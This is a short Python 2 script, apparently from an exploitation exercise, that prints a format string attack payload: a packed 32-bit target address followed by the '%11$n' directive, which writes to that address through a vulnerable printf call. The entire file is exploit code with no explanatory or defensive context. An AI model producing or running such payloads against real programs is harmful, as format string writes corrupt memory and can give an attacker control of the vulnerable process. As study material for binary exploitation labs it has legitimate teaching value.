#!/usr/bin/python
import struct

padding = ""
padding += struct.pack("I", 0x804a04c)
padding += "%11$n"

print padding